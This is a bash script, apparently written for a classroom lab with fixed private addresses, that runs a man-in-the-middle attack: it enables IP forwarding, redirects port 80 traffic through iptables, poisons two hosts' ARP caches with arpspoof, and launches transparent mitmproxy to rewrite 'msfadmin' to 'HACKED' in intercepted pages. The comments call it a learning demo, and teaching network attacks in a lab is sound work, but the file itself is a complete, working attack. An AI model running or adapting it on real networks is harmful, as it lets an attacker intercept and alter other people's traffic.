#!/bin/bash
# -- About -- #
# This is a quick script written for kali to demostrate Arpspoofing and mitm injection.
# It is configured specifically for the E314C Boxes setup, with known IPs and network interfaces.
# It is meant for learning/ demo purposes only.
#
# Original author: Rael S-R

# -- Hardware setup: -- #
# enable ip_forwarding
sysctl -w net.ipv4.ip_forward=1
# or you could:
# echo 1 > /proc/sys/net/ipv4/ip_forward

# Turn on some iptables rules so that traffic in on :80 gets rerouted out on :8080
iptables -t nat -A PREROUTING -i eth1  -p tcp --dport 80 -j REDIRECT --to-port 8080

# -- And now for the attack bits --#

# Setup the arp spoofs
#	note: 'gnome-terimnal -- arpspoof' calls are there so it pops a new terminal for these.
gnome-terminal -- arpspoof -i eth1 -t 192.168.64.4 192.168.64.2 &	# Make 64.4 think we're 64.2
gnome-terminal -- arpspoof -i eth1 -t 192.168.64.2 192.168.64.4 &	# make 64.2 think we're 64.1


# Setup mitm proxy
# - copy host headers
# - Transparent mode
# - when body contains "msfadmin", replace "msfadmin" with "HACKED" 
#mitmproxy --host -T --replace ":~b msfadmin:msfadmin:HACKED"
mitmproxy --mode transparent --showhost --replacement ":~b msfadmin:msfadmin:HACKED"

echo "Remember to ctrl+C in the other terminals that've popped up."
echo "Arpspoof will then re-arp the targets and they should close by themselves."
